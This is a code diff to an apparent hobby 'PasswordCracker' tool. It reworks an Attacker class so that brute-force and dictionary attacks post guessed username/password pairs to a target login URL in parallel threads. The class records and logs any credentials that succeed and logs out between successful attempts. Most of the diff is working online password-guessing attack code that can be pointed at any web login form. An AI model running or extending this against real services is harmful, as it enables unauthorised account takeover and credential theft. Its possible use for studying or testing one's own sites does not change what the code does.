@@ -2,6 +2,7 @@ from PasswordCracker.PasswordAttackTypes import BruteForceAttack, DictionaryAtta
 
 import requests
 import time
+import threading
 
 
 class Attacker():
@@ -16,16 +17,11 @@ class Attacker():
         # Layout of the login form. You can check this through inspect element.
         # Or if you built the website you can check the code!
         self.formTags = formTags or ["Username", "Password"]
-
         # By default this is set to:
         # {
         #   "Username" : "dummy",
         #   "Password" : "dummy"
         # }
-        self.data = {
-            self.formTags[0]:"dummy", # form id for username
-            self.formTags[1]:"dummy" # form id for password
-        }
 
         # list of attack methods
         # You can write your own class but it must contain a generatePasswords() method that returns an iterator of guesses
@@ -41,88 +37,98 @@ class Attacker():
                   findAll=False, testMode=True, verbose=False, log=False):
         print("ATTACKING", self.loginURL)
 
-
         # can specify which attack methods to use
         # if not specified, use all that are loaded in
         if not attackMethods:
             attackMethods = [name for name in self.attackMethods]
 
+        threads = []
+        for name, attackMethod in self.attackMethods.items():
+
+            # skip if we don't want to run a particular mode
+            if name not in attackMethods:
+                continue
+
+            result = []
+            thread = threading.Thread(name=name, target=self.attack, args=
+            (checkSuccess, name, attackMethod, username, findAll, testMode, verbose, log, result))
+
+            threads.append([thread, result])
+            thread.start()
+
+        for thread, _ in threads:
+            thread.join()
+
+        for thread, result in threads:
+            print("====================================================================")
+            print("%s found %d passwords:" % (thread.getName(), len(result)))
+            print("====================================================================")
+
+            for pw in result:
+                print(pw)
+
+
+    def attack(self, checkSuccess, name, attackMethod, username, findAll, testMode, verbose, log, foundPasswords):
+
         with requests.Session() as session:
-            for name, attackMethod in self.attackMethods.items():
+            count = 0
 
-                # skip if we don't want to run a particular mode
-                if name not in attackMethods:
-                    continue
+            # if we are logging, override the old log file
+            if log:
+                with open(name + ".txt", 'w') as file:
+                    file.write("%s\n\n" % str(attackMethod))
 
-                # stores password've we cracked
-                foundPasswords = set({})
+            startTime = time.time()
 
-                # if we are logging, override the old log file
-                if log:
-                    with open(name + ".txt", 'w') as file:
-                        file.write("%s\n\n" % str(attackMethod))
+            # logging if needed
+            with open(name + ".txt", 'a') as file:
 
-                startTime = time.time()
-                print("=========================================================================\n" + str(attackMethod))
 
-                # logging if needed
-                with open(name + ".txt", 'a') as file:
-
-                    count = 0
-                    for password in attackMethod.generatePasswords():
-                        count += 1
-                        if testMode:
-                            if verbose:
-                                print("TEST MODE: generated password [%s]" % password)
-                            continue
-
-                        # if username is not passed as argument, we will user the password as our username
-                        self.setDataFields(username, password)
-
-                        response = session.post(self.loginURL, data=self.data)
-                        found = checkSuccess(response)
-
+                # loop through passwords and try them all
+                for password in attackMethod.generatePasswords():
+                    count += 1
+                    if testMode:
                         if verbose:
-                            print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))
+                            print("TEST MODE: generated password [%s]" % password)
+                        continue
 
-                        if found:
-                            file.write(password + "\n")
+                    # if username is not passed as argument, we will use the password as our username
+                    data = self.getDataFields(username, password)
 
-                            if not verbose:
-                                print("Found [%s]" % password)
-                            foundPasswords.add(password)
+                    response = session.post(self.loginURL, data=data)
+                    found = checkSuccess(response)
 
-                            # if we are just brute forcing a single username exit after we found it
-                            if not findAll:
-                                break
+                    if verbose:
+                        print("%s Trying [%s] ... %s" % (name, password, "SUCCESS" if found else "FAILED"))
 
-                        session.get("http://127.0.0.1:5000/logout")
+                    if found:
+                        file.write(password + "\n")
 
-                    results = "%s generated %d passwords in %s ms. Found %d password:" \
-                              % (name, count, time.time() - startTime, len(foundPasswords))
+                        if not verbose:
+                            print("%s Found [%s]" % (name, password))
+                        foundPasswords.append(password)
 
-                    # log results
-                    if log:
-                        file.write(results)
+                        # if we are just brute forcing a single username exit after we found it
+                        if not findAll:
+                            break
 
-                    print(results)
+                        # logout so we can login again
+                        session.get(self.logoutURL)
 
-                for pw in foundPasswords:
-                    print(pw)
+                results = "%s generated %d passwords in %s ms. Found %d password:" \
+                          % (name, count, time.time() - startTime, len(foundPasswords))
 
-                print("=========================================================================\n")
+                # log results
+                if log:
+                    file.write(results)
 
-    def setDataFields(self, username, password):
-        self.data[self.formTags[0]] = username or password
-        self.data[self.formTags[1]] = password
+    def getDataFields(self, username, password):
 
-    def getPasswords(self):
-        result = []
-        for attackMethod in self.attackMethods:
-            print(attackMethod)
-            result += attackMethod.generatePasswords()
-
-        return result
+        # if username not supplied, we will assume it is the same as password
+        return {
+            self.formTags[0]:username or password, # form id for username
+            self.formTags[1]:password # form id for password
+        }
 
     def addAttackMethod(self, method):
         self.attackMethods[type(method).__name__] = method
